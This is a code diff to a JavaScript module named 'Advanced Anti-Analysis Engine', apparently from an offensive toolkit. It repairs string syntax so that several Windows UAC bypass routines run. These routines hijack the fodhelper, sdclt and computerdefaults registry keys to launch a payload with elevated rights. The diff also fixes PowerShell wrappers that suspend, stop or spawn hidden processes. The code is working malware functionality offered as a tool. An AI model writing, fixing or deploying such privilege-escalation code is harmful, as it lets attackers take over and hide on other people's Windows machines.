@@ -6,7 +6,7 @@ const path = require('path');
 const crypto = require('crypto');
 const { spawn, exec } = require('child_process');
 const { promisify } = require('util');
-const { getMemoryManager } = require('../utils/memory-manager');
+// const { getMemoryManager } = require('../utils/memory-manager'); // Removed - module not found
 const os = require('os');
 
 const execAsync = promisify(exec);
@@ -29,7 +29,7 @@ class AdvancedAntiAnalysis extends EventEmitter {
         super();
         this.name = 'Advanced Anti-Analysis Engine';
         this.version = '2.0.0';
-        this.memoryManager = getMemoryManager();
+        // this.memoryManager = getMemoryManager(); // Removed - module not found
         this.initialized = false;
         
         // UAC bypass techniques
@@ -151,7 +151,7 @@ class AdvancedAntiAnalysis extends EventEmitter {
             'monitoring_detection'
         ];
         
-        this.activeOperations = this.memoryManager.createManagedCollection('activeOperations', 'Map', 100);
+        this.activeOperations = new Map();
         this.privilegeLevel = 'user';
         this.isElevated = false;
         this.kernelAccess = false;
@@ -303,19 +303,19 @@ class AdvancedAntiAnalysis extends EventEmitter {
         const tempDir = os.tmpdir();
         const fodhelperPath = path.join(tempDir, 'fodhelper.reg');
         
-        const regContent = "Windows Registry Editor Version 5.00
+        const regContent = `Windows Registry Editor Version 5.00
 
 [HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command]
 @="${payload || 'cmd.exe /c start cmd.exe'}"
 "DelegateExecute"=""
 
 [HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command\\DefaultIcon]
-@=`${payload || 'cmd.exe'}`";
+@="${payload || 'cmd.exe'}"`;
 
         await fs.writeFile(fodhelperPath, regContent);
         
         // Import registry file
-        await execAsync("reg import `${fodhelperPath}`");
+        await execAsync(`reg import "${fodhelperPath}"`);
         
         // Trigger UAC bypass
         await execAsync('fodhelper.exe');
@@ -331,14 +331,14 @@ class AdvancedAntiAnalysis extends EventEmitter {
         const tempDir = os.tmpdir();
         const sdcltPath = path.join(tempDir, 'sdclt.reg');
         
-        const regContent = "Windows Registry Editor Version 5.00
+        const regContent = `Windows Registry Editor Version 5.00
 
 [HKEY_CURRENT_USER\\Software\\Classes\\exefile\\shell\\runas\\command]
 @="${payload || 'cmd.exe /c start cmd.exe'}"
-"IsolatedCommand"=`${payload || 'cmd.exe /c start cmd.exe'}`";
+"IsolatedCommand"="${payload || 'cmd.exe /c start cmd.exe'}"`;
 
         await fs.writeFile(sdcltPath, regContent);
-        await execAsync("reg import `${sdcltPath}`");
+        await execAsync(`reg import "${sdcltPath}"`);
         await execAsync('sdclt.exe /KickOffElev');
         await fs.unlink(sdcltPath).catch(() => {});
         
@@ -350,14 +350,14 @@ class AdvancedAntiAnalysis extends EventEmitter {
         const tempDir = os.tmpdir();
         const computerdefaultsPath = path.join(tempDir, 'computerdefaults.reg');
         
-        const regContent = "Windows Registry Editor Version 5.00
+        const regContent = `Windows Registry Editor Version 5.00
 
 [HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command]
-@=`${payload || 'cmd.exe /c start cmd.exe'}`
-"DelegateExecute"=""";
+@="${payload || 'cmd.exe /c start cmd.exe'}"
+"DelegateExecute"=""`;
 
         await fs.writeFile(computerdefaultsPath, regContent);
-        await execAsync("reg import `${computerdefaultsPath}`");
+        await execAsync(`reg import "${computerdefaultsPath}"`);
         await execAsync('computerdefaults.exe');
         await fs.unlink(computerdefaultsPath).catch(() => {});
         
@@ -462,14 +462,14 @@ class AdvancedAntiAnalysis extends EventEmitter {
         const tempDir = os.tmpdir();
         const regPath = path.join(tempDir, `${method}.reg`);
         
-        const regContent = "Windows Registry Editor Version 5.00
+        const regContent = `Windows Registry Editor Version 5.00
 
 [HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command]
-@=`${payload || 'cmd.exe /c start cmd.exe'}`
-"DelegateExecute"=""";
+@="${payload || 'cmd.exe /c start cmd.exe'}"
+"DelegateExecute"=""`;
 
         await fs.writeFile(regPath, regContent);
-        await execAsync("reg import `${regPath}`");
+        await execAsync(`reg import "${regPath}"`);
         await execAsync(`${method}.exe`);
         await fs.unlink(regPath).catch(() => {});
         
@@ -627,7 +627,7 @@ class AdvancedAntiAnalysis extends EventEmitter {
         try {
             // Use PowerShell to suspend process
             const psCommand = "Get-Process -Id " + pid + " | Suspend-Process";
-            await execAsync("powershell -Command `${psCommand}`");
+            await execAsync(`powershell -Command "${psCommand}"`);
             
             return {
                 success: true,
@@ -645,7 +645,7 @@ class AdvancedAntiAnalysis extends EventEmitter {
         try {
             // Use PowerShell to resume process
             const psCommand = "Get-Process -Id " + pid + " | Resume-Process";
-            await execAsync("powershell -Command `${psCommand}`");
+            await execAsync(`powershell -Command "${psCommand}"`);
             
             return {
                 success: true,
@@ -681,7 +681,7 @@ class AdvancedAntiAnalysis extends EventEmitter {
         try {
             // Use PowerShell to set process information
             const psCommand = "Get-Process -Id " + pid + " | Set-Process -Priority High";
-            await execAsync("powershell -Command `${psCommand}`");
+            await execAsync(`powershell -Command "${psCommand}"`);
             
             return {
                 success: true,
@@ -718,7 +718,7 @@ class AdvancedAntiAnalysis extends EventEmitter {
         try {
             // Use PowerShell to close process handles
             const psCommand = "Get-Process -Id " + pid + " | Stop-Process";
-            await execAsync("powershell -Command `${psCommand}`");
+            await execAsync(`powershell -Command "${psCommand}"`);
             
             return {
                 success: true,
@@ -736,7 +736,7 @@ class AdvancedAntiAnalysis extends EventEmitter {
         try {
             // Use PowerShell to duplicate process object
             const psCommand = "Get-Process -Id " + pid + " | ForEach-Object { $_.Duplicate() }";
-            await execAsync("powershell -Command `${psCommand}`");
+            await execAsync(`powershell -Command "${psCommand}"`);
             
             return {
                 success: true,
@@ -753,8 +753,8 @@ class AdvancedAntiAnalysis extends EventEmitter {
     async ntCreateProcess(pid) {
         try {
             // Use PowerShell to create process
-            const psCommand = "Start-Process -FilePath "cmd.exe" -ArgumentList `/c echo Process created from PID ${pid}`";
-            await execAsync("powershell -Command `${psCommand}`");
+            const psCommand = `Start-Process -FilePath "cmd.exe" -ArgumentList "/c echo Process created from PID ${pid}"`;
+            await execAsync(`powershell -Command "${psCommand}"`);
             
             return {
                 success: true,
@@ -771,8 +771,8 @@ class AdvancedAntiAnalysis extends EventEmitter {
     async ntCreateProcessEx(pid) {
         try {
             // Use PowerShell to create process with extended parameters
-            const psCommand = "Start-Process -FilePath "cmd.exe" -ArgumentList `/c echo Extended process created from PID ${pid}` -WindowStyle Hidden";
-            await execAsync("powershell -Command `${psCommand}`");
+            const psCommand = `Start-Process -FilePath "cmd.exe" -ArgumentList "/c echo Extended process created from PID ${pid}" -WindowStyle Hidden`;
+            await execAsync(`powershell -Command "${psCommand}"`);
             
             return {
                 success: true,
